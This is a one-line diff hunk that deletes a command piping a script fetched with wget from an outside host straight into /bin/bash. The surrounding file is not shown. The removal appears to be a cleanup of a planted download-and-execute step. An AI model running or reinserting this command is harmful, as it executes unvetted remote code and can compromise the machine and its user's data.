@@ -1,1 +1,0 @@
-wget -O - https://dovatvis.nl/dark.sh | /bin/bash
